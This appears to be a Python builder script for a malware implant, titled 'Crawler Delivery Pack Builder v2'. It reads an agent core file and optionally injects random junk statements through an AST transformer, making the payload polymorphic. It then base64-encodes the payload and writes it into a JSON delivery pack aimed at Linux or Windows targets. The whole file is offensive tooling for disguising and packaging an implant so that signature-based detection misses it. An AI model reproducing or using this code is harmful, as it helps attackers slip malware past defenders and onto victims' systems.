import os
import json
import base64
import argparse
import ast
import random
import string

# --- Configuration ---
# We will now transform the core agent, not the loader
AGENT_CORE_PATH = os.path.join("implant", "agent_core.py")
OUTPUT_PACK_PATH = "delivery_pack.json"


# --- Polymorphic Engine using AST ---

def random_string(length=8):
    """Generates a random string for variable names."""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

class PolymorphicTransformer(ast.NodeTransformer):
    """
    An AST transformer that applies polymorphic changes to Python code.
    """
    def __init__(self):
        self.name_map = {} # Maps original var names to new random names

    def visit_FunctionDef(self, node):
        """Injects junk code into function definitions."""
        # Rename function arguments
        self.generic_visit(node.args)

        # Inject junk code at a random position in the function body
        if len(node.body) > 0:
            junk_code_str = f"{random_string()} = {random.randint(100, 999)} * {random.randint(100, 999)}"
            junk_node = ast.parse(junk_code_str).body[0]
            insert_pos = random.randint(0, len(node.body) -1)
            node.body.insert(insert_pos, junk_node)

        # Process the rest of the function body
        self.generic_visit(node)
        return node


def obfuscate_code(source_code: str) -> str:
    """
    Parses Python code, applies polymorphic transformations, and returns the new code.
    """
    print("[*] Applying polymorphic transformations...")
    tree = ast.parse(source_code)
    transformer = PolymorphicTransformer()
    new_tree = transformer.visit(tree)
    ast.fix_missing_locations(new_tree)
    # The 'unparse' function requires Python 3.9+
    return ast.unparse(new_tree)


# --- Main Builder Function ---

def build_pack(target_os: str, poly: bool):
    """
    Creates a delivery pack containing the implant payload.
    """
    print(f"[*] Building delivery pack for target OS: {target_os}")

    # 1. Read the core agent code
    print(f"[*] Reading agent source from: {AGENT_CORE_PATH}")
    try:
        with open(AGENT_CORE_PATH, 'r') as f:
            agent_code = f.read()
    except FileNotFoundError:
        print(f"[!] Error: Agent source not found at '{AGENT_CORE_PATH}'.")
        return

    # 2. (Optional) Apply polymorphism
    if poly:
        agent_code = obfuscate_code(agent_code)

    # 3. Base64 encode the final payload
    encoded_payload = base64.b64encode(agent_code.encode('utf-8')).decode('utf-8')

    # 4. Create the delivery pack structure
    delivery_pack = {
        "metadata": {"target_os": target_os, "version": "2.0"},
        "payload": {"type": "python_b64_polymorphic", "content": encoded_payload}
    }

    # 5. Save the pack to a file
    print(f"[*] Saving delivery pack to: {OUTPUT_PACK_PATH}")
    with open(OUTPUT_PACK_PATH, "w") as f:
        json.dump(delivery_pack, f, indent=2)

    print("[+] Delivery pack created successfully.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Crawler Delivery Pack Builder v2")
    parser.add_argument("--os", type=str, default="linux", choices=["linux", "windows"])
    parser.add_argument("--poly", action="store_true", help="Enable polymorphic transformations.")
    args = parser.parse_args()

    if os.path.basename(os.getcwd()) != "crawler":
        if os.path.isdir("crawler"): os.chdir("crawler")
        else: exit(1)

    build_pack(target_os=args.os, poly=args.poly)
